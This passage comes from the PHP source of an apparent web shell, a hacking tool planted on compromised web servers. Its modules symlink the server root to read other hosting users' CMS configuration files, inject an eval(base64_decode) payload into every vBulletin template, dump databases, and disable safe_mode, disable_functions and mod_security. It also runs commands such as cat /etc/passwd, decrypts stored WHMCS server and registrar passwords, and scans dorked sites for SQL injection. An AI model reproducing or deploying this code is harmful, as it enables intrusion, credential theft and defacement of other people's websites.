$haystackwp2=$wp2[0];
$Joomla=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/configuration.php';
$jmla=get_headers($Joomla);
$haystackjmla=$jmla[0];
$Joomla2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/joomla/configuration.php';
$jmla2=get_headers($Joomla2);
$haystackjmla2=$jmla2[0];
$Vbulletin=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/includes/config.php';
$vb=get_headers($Vbulletin);
$haystackvb=$vb[0];
$Vbulletin3=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/vb/includes/config.php';
$vb3=get_headers($Vbulletin3);
$haystackvb2=$vb3[0];
$Vbulletin5=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/forum/includes/config.php';
$vb5=get_headers($Vbulletin5);
$haystackvb5=$vb5[0];
$whmcs1=$WebUrl.'/sym/root/home/'.$UID['name'].'public_html/clients/configuration.php';
$whm=get_headers($whmcs1);
$haystackwhm=$whm[0];
$whmcs1=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/support/configuration.php';
$whm=get_headers($whmcs1);
$haystackwhm=$whm[0];
$whmcs2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/client/configuration.php';
$whm2=get_headers($whmcs2);
$haystackwhm2=$whm2[0];
$whmcs3=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/submitticket.php';
$whm3=get_headers($whmcs3);
$haystackwhm3=$whm3[0];
$whmcs4=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/client/configuration.php';
$whm4=get_headers($whmcs4);
$haystackwhm=$whm4[0];
$Websitez = strpos($haystackwp,'200');
$Websitez='&nbsp;';
if (strpos($haystackwp,'200') == true )
{
$Websitez="<a href='".$Wordpress."' target='_blank'>Wordpress</a>";
}
elseif (strpos($haystackwp2,'200') == true)
{
$Websitez="<a href='".$Wordpress2."' target='_blank'>Wordpress</a>";
}
elseif (strpos($haystackjmla,'200')  == true and strpos($haystackwhm3,'200')  == true )
{
$Websitez=" <a href='".$whmcs3."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackwhm,'200')  == true)
{
$Websitez =" <a href='".$whmcs1."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackwhm2,'200')  == true)
{
$Websitez =" <a href='".$whmcs2."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackjmla,'200')  == true)
{
$Websitez=" <a href='".$Joomla."' target='_blank'>Joomla</a>";
}
elseif (strpos($haystackjmla2,'200')  == true)
{
$Websitez=" <a href='".$Joomla2."' target='_blank'>Joomla</a>";
}
elseif (strpos($haystackvb,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin."' target='_blank'>vBulletin</a>";
}
elseif (strpos($haystackvb2,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin3."' target='_blank'>vBulletin</a>";
}
elseif (strpos($Vbulletin4,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin5."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$name = $UID['name'] ;
echo '<tr><td><a href=http://www.'.$string[1][0].'/>'.$string[1][0].'</a></td>
<td>'.$Websitez.'</td></tr></center>';
flush();
}
}
}
}
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=vb" method="post">

<br><br><br><div align="center">
<H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
<font color="#00FF00">&nbsp;vB Index Changer</font><font color="#FF0000">
<font face="Tahoma">! Change All Pages For Forum !&nbsp;
<br></font></div><br>

<?

if(empty($_POST['index'])){
echo "<center><FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" style='color:#FF0000;background-color:#000000' name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"vb\" name=\"password\" type=\"text\"><br>
<br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" style='color:#FF0000;background-color:#000000' name=\"send\" type=\"submit\">
</FORM></center>";
}else{
$localhost = $_POST['localhost'];
$database = $_POST['database'];
$username = $_POST['username'];
$password = $_POST['password'];
$index = $_POST['index'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());

$index=str_replace("\'","'",$index);

$set_index = "{\${eval(base64_decode(\'";

$set_index .= base64_encode("echo \"$index\";");


$set_index .= "\'))}}{\${exit()}}</textarea>";

echo("UPDATE template SET template ='".$set_index."' ") ;
$ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}

}
# Footer
}
	
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

<?php   

@set_time_limit(0);

echo "<center>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'mysqlbackup'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mysqlbackup" method="post">

<?php

echo '<center><br><br><br>
<table border=1 width=400 style="border-collapse: collapse" cellpadding=2>
<tr>
<td width=400 colspan=2 style=\'color:#FF0000;background-color:#000000\'><p align=center>
<b><font face=Arial size=2 style=\'color:#FF0000;background-color:#000000\'>Backup Database</font></b>
</td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'>
<font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>DB Type:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'>
<form method=post action="'.$me.'">
<select style=\'color:#FF0000;background-color:#000000\' name=method>
<option value="gzip">Gzip</option>
<option value="sql">Sql</option>
</select></td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'>
<font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Server:</font>
</td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'>
<input type=text name=server style=\'color:#FF0000;background-color:#000000\' value=localhost size=35>
</td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Username:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=username size=35></td>
</tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Password:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=password></td>
</tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Data Base Name:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=dbname></td>
</tr>
<tr>
<td width=400 colspan=2 style=\'color:#FF0000;background-color:#000000\'><center><input style=\'color:#FF0000;background-color:#000000\' type=submit value="  Dump!  " ></td>
</tr>
</table></form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='sql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}

function filesize_n($path)
{
        $size = @filesize($path);
        if( $size < 0 ){
            ob_start();
            system('ls -al "'.$path.'" | awk \'BEGIN {FS=" "}{print $5}\'');
            $size = ob_get_clean();
        }

        return $size;
}
function format_size($size) {
      $sizes = array(" Bytes", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB");
      if ($size == 0) { return('n/a'); } else {
      return (round($size/pow(1024, ($i = floor(log($size, 1024)))), $i > 1 ? 2 : 0) . $sizes[$i]); }
}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='sql'){
fclose ($fp);
}else{
gzclose($fp);}
$sizedatabasefile = filesize_n($file);
$sizehumanreadable = format_size($sizedatabasefile);
echo "<br><br>
<center><font color='#FF0000'>Download Database -&#62; </font>
<a href='$file'>Here</a>
<font color='#FF0000'> | DatabaseFileSize -&#62; $sizehumanreadable </font></center>";
flush();
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'security-mode'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=security-mode" method="post">

<?php

echo "<html>
<center><br><br><br>
<font color=#FF0000 > Disable SafeMode and Clear Disable Function using php.ini </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='phpinisafemode' value='$pwd' style='color:#FF0000;background-color:#000000' /><br> 
<input type='submit' name='dsmsubmit' style='color:#FF0000;background-color:#000000' value='Create PHP.INI' />
</form>
<br><br>
<font color=#FF0000 > Disable SafeMode and Clear Disable Function using Htaccess </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='htaccesssafemode' style='color:#FF0000;background-color:#000000' value='$pwd' /><br>
<input type='submit' name='omssubmit' style='color:#FF0000;background-color:#000000' value='Create .HTACCESS' />
</form>";

$dirphpini = $_POST['phpinisafemode'];
$dirhtaccess = $_POST['htaccesssafemode'];
$phpininamelol = "php.ini";

if($_POST['omssubmit'])
{
 $fse=fopen("$dirphpini.htaccess","w");
 fwrite($fse,'<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
 fclose($fse);
}

else if ($_POST['dsmsubmit'])
{
 $fse=fopen("$dirhtaccess$phpininamelol","w");
 fwrite($fse,'safe_mode=OFF
disable_functions=NONE');
 fclose($fse);
}
}   

elseif(isset($_GET['x']) && ($_GET['x'] == 'process'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=process" method="post">

<?php

function processc99() {
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");} 
 else {$handler = "tasklist";} 
 $ret = myshellexec($handler); 
 if (!$ret) {echo "Can't execute \"".$handler."\"!";} 
 else 
 { 
  if (empty($processes_sort)) {$processes_sort = $sort_default;} 
  $parsesort = parsesort($processes_sort); 
  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;} 
  $k = $parsesort[0]; 
  $ret = htmlspecialchars($ret); 
  if (!$win) 
  { 
   if ($pid) 
   { 
    if (is_null($sig)) {$sig = 9;} 
    echo "Sending signal ".$sig." to #".$pid."... "; 
    if (posix_kill($pid,$sig)) {echo "OK.";} 
    else {echo "ERROR.";} 
   } 
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);} 
   $stack = explode("\n",$ret); 
   $head = explode(" ",$stack[0]); 
   unset($stack[0]);  
   $prcs = array(); 
   foreach ($stack as $line) 
   { 
    if (!empty($line)) 
{ 
 echo "<tr>"; 
     $line = explode(" ",$line); 
     $line[10] = join(" ",array_slice($line,10)); 
     $line = array_slice($line,0,11); 
     $prcs[] = $line; 
     echo "</tr>"; 
    } 
   } 
  } 
  else 
  { 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
   while (ereg(" ",$ret)) {$ret = str_replace(" ","",$ret);} 
   $ret = convert_cyr_string($ret,"d","w"); 
   $stack = explode("\n",$ret); 
   unset($stack[0],$stack[2]); 
   $stack = array_values($stack); 
   $head = explode("",$stack[0]); 
   $head[1] = explode(" ",$head[1]); 
   $head[1] = $head[1][0]; 
   $stack = array_slice($stack,1); 
   unset($head[2]); 
   $head = array_values($head); 
   if ($k > count($head)) {$k = count($head)-1;} 
   $prcs = array(); 
   foreach ($stack as $line) 
   { 
    if (!empty($line)) 
    { 
     echo "<tr>"; 
     $line = explode("",$line); 
     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]); 
     $line[2] = intval(str_replace(" ","",$line[2]))*1024;  
     $prcs[] = $line; 
     echo "</tr>"; 
    } 
   } 
  } 
  $head[$k] = "<b>".$head[$k]."</b>".$y; 
  $v = $processes_sort[0]; 
  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);} 
  $tab = array(); 
  $tab[] = $head; 
  $tab = array_merge($tab,$prcs); 
  echo "<TABLE height=1 cellSpacing=0 cellPadding=5 width=\"100%\" border=1>"; 
  foreach($tab as $i=>$k) 
  { 
   echo "<tr>"; 
   foreach($k as $j=>$v) {
   if ($win and $i > 0 and $j == 2) {
   $v = view_size($v);
   } 
   
   echo "<td>".$v."</td>";} 
   echo "</tr>"; 
  } 
  echo "</table>"; 
 }
}

echo "<center><br><br>";
	if($win) {
	echo "<form method='post'>
	<select style='color:#FF0000;background-color:#000000' name='windowsprocess'>
	<option name='systeminfo'>System Info</option>
	<option name='active'>Active Connections</option>
	<option name='runningserv'>Running Services</option>
	<option name='useracc'>User Accounts</option>
	<option name='showcom'>Show Computers</option>
	<option name='arptab'>ARP Table</option>
	<option name='ipconf'>IP Configuration</option>
	</select>
	<input type='submit' style='color:#FF0000;background-color:#000000' name='submitwinprocess' value='View'>
	</form>
	";
	} else {
	echo "<form method='post'>
	<select style='color:#FF0000;background-color:#000000' name='nonwindowsprocess'>
	<option name='processsta'>Process status</option>
	<option name='syslog'>Syslog</option>
	<option name='resolv'>Resolv</option>
	<option name='hosts'>Hosts</option>
	<option name='passwd'>Passwd</option>
	<option name='cpuinfo'>Cpuinfo</option>
	<option name='version'>Version</option>
	<option name='sbin'>Sbin</option>
	<option name='interrupts'>Interrupts</option>
	<option name='lsattr'>lsattr</option>
	<option name='uptime'>Uptime</option>
	<option name='fstab'>Fstab</option>
	<option name='hddspace'>HDD Space</option>
	</select>
	<input type='submit' style='color:#FF0000;background-color:#000000' name='submitnonwinprocess' value='View'>
	</form>
	";
	}
	
	$windowsprocess = $_POST['windowsprocess'];
	$nonwindowsprocess = $_POST['nonwindowsprocess'];
	
	if ($windowsprocess=="System Info") $winruncom = "systeminfo";
	if ($windowsprocess=="Active Connections") $winruncom = "netstat -an";
	if ($windowsprocess=="Running Services") $winruncom = "net start";
	if ($windowsprocess=="User Accounts") $winruncom = "net user";
	if ($windowsprocess=="Show Computers") $winruncom = "net view";
	if ($windowsprocess=="ARP Table") $winruncom = "arp -a";
	if ($windowsprocess=="IP Configuration") $winruncom = "ipconfig /all";
	if ($nonwindowsprocess=="Process status") $systeminfo = "ps aux";
	if ($nonwindowsprocess=="Syslog") $winruncom = "cat  /etc/syslog.conf";
	if ($nonwindowsprocess=="Resolv") $winruncom = "cat  /etc/resolv.conf";
	if ($nonwindowsprocess=="Hosts") $winruncom = "cat /etc/hosts";
	if ($nonwindowsprocess=="Passwd") $winruncom = "cat /etc/passwd";
	if ($nonwindowsprocess=="Cpuinfo") $winruncom = "cat /proc/cpuinfo";
	if ($nonwindowsprocess=="Version") $winruncom = "cat /proc/version";
	if ($nonwindowsprocess=="Sbin") $winruncom = "ls -al /usr/sbin";
	if ($nonwindowsprocess=="Interrupts") $winruncom = "cat /proc/interrupts";
	if ($nonwindowsprocess=="lsattr") $winruncom = "lsattr -va";
	if ($nonwindowsprocess=="Uptime") $winruncom = "uptime";
	if ($nonwindowsprocess=="Fstab") $winruncom = "cat /etc/fstab";
	if ($nonwindowsprocess=="HDD Space") $winruncom = "df -h";
	

	if (isset($winruncom)) {
	echo "<table class='cmdbox'> 
	<tbody><tr>
	<td colspan='2'> 
	<textarea class='output' name='content'>".exe($winruncom)."</textarea> 
	</td></tr></table></center>";
	}
	
	if (isset($systeminfo)) {
		echo "<br><br>";
		processc99();
	}

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcs'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=whmcs" method="post">

<?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "<hr>
<br>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table border=1>
<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:#000000' type='text' size='30' name='cc_encryption_hash' value=''></td></tr>
</table>
<br>
<INPUT class=submit type='submit' style='color:#FF0000;background-color:#000000' value='Submit' name='Submit'>
</FORM>
</center>
<hr>";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">

<?php

echo '<br><br><center><form method="post" action=""><font color="red">Dork :</font> <input type="text" value="" name="dork" style="color:#FF0000;background-color:#000000" size="20"/><input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font style="color:#FF0000"> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font style="color:#FFFFFF"><b>'.$url.'</b></font><font style="color:#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}

ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone-h')){	?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone-h" method="post">
<br><br><? echo '<p style="text-align: center;"> <img alt="" src="data:image/gif;base64,R0lGODlhBQFDAPcAAPr6+vjv71pXWLpnZ1MBAZ6dnf39/ZMBAGQBAf4eHtTU1L0AALw0NLkAAdy8vP44OKwTE0wXF8cBAjwiIrpFRVRDQ6ECALQhIbSBgZtCQsQXF4wAAK4AAdKOjtvb27ITE1gYGJYoKKlHR7l0dK4dHfLy8pQyMtiqqkpJSbq6uv1NTbouLggFBbuRkWMXF70lJcVSUlg1NaUuLaYAAIMBAMAAAFIsLPX19UwnJyoBAYWCg6oAAMVnZzEKCuDg4MO4uBwbHMV/f4Q1Ne7u7ioaGszMzOfAwK0MDL07O8hYWeXNzciennsAALQAAHIWFrhTVMl0dOcCAnQAAKyrq0YDA6eIiIgiIpYYGJiGht+Ojp51dcPDw50AAP0ICMBCQjcWFrOzsyQiIr4UFNNISD47PNNXV97IyMNLS5gAADMyMuzf38IkJKt1derq6rwcHM48PLwMDLMMDMnHx6UMDPPf38uvr3orK2QsLM5JSiwrK7IrKmdkZcMsLHViY6k2NrIBANh9fENBQdqfn2shIaZgYHg5OUw2NosTFKSWlsszM3d0dcpVVebm5stBQbAAAGo6O7YBAKWlpcVdXbQ9PV8gIMolJcQzM8A9PoMKCXoMDA8PD+OwsKkGBtwCAs0sLMANDdVgYK4EBbUxMBsICKyhobkFBV5QUElERN3S0vDPzyYlJb4EBLqgoLQPD41ERB4TE6YEBPHm5tkZGc8CArYYGLEFBco3ODc1NbwQEJUJCctGR68QD7oXF7MXF7gnJ20pKZ8QEIcGBWsJCcQFBbQFBcAHB7oZGKUICF4ODsJHR7ACApwGBqMGBJGPkOTj46sJCLwDBConKLwICMEQEMYHB1JQUKsDA4oKCuMqKrcBALQDA8EBALMBAYMPD5M/P9BPUN5TU8MvL7tOTsMeHrAICNq/
v744Obs3N5CBgVA+Pr4gIKYCArcJCTEuLrlvb8cwMM5YWVEODXNtbncGBsQoJ3oQEDo4OP4CAqwAAKQAAMQAASMfIMIAAMgAAP///wAAACH5BAAAAAAALAAAAAAFAUMAAAj/APsJHEiwoMGB/Bb8mYHmAA0mUiJKZMKExgEuO/404Hewo8ePIEOKHEmypMmTKFOqXDlQ3wJHXDZAFEKoRbly/nLqvBmEkJUNaPI5WsCRpdGjSJMqXcrUJL8GOw4wqUdoSQCdWLNiVSPoyUV8G5uKHUu2rNmj+hrM2CBFiFWsAOrU2eJhCAADWv1l2eQvQAcSXPARPUu4sOHDISUoXsy4sYQF+A5IcYUTK982QcZIalGE0V2tAQQ1ApXKn6AQXJQt0Oe4tevXsGPLnk27tu3buHPr3r1YXzYuNKzU0WngRok2APwB8GHLkyceqG7gzesPEC4YVzsAm9FAH2ve4MOL/x9PPjyXQzLSq9dTbIFu7/Djx6/BQSqbq/48pPhhxocDJcmVAIgG02zTSlYGAJCcTnR0oJMa4ljQRA3yVWjhhRhmqOGGHHbo4YcghqghFySo8MCJJyYwiwYicrjADhvUc4I/qCwBRgHuJCKIAYIkktMQcrCIBiFZAVBCCQvmFMAmdOjUgQVD8dPilFRWaeWVWGLIBS8J3OOll1HMUUmW8S0wAw0m0GEAK6B8MwAGY2RzFQDf5FRCERo0cUiTcAEASF745ZQKBBwQReahiCaqqIhbdvnlPVEcMSaZ2zSQD5oBMIIBKGM4Nw4kh9iZihHKeZDIDhlQR50CBTRTQDmp0P8hikbbLGrrrbgiyoUxjn4Z5qQh8iPssMLWYCYNRHowAji2aEDNAhZ0o0ZOsYCiUwlZcOGOqlk5I0AY+4S7DyWbBLBCEwvUQOy67Lbr7rvwxivvvPTWa++9+Arb6KOQipnvu8eaQCMP33jCYhNoSLFETgYsiVUAkgTBrU4KtCNuuGGoMoEgAYSTTbr/
